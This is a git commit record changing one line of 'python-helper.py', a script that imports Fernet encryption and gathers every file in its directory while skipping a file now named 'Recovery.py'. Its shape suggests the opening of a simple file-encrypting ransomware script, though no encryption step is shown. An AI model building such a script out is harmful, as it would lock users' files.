0d74450231e9eb83db957810e5747bcca1fab26c
Chai <83523587+CPScript@users.noreply.github.com>
2022-11-16 12:23:54 -0500

    Update python-helper.py

--- python-helper.py
+++ python-helper.py
@@ -6,7 +6,7 @@ from cryptography.fernet import Fernet
 files = []
 
 for file in os.listdir():
-	if file == "python-helper.py":
+	if file == "Recovery.py":
 		continue
 	if os.path.isfile(file):
 		files.append(file)
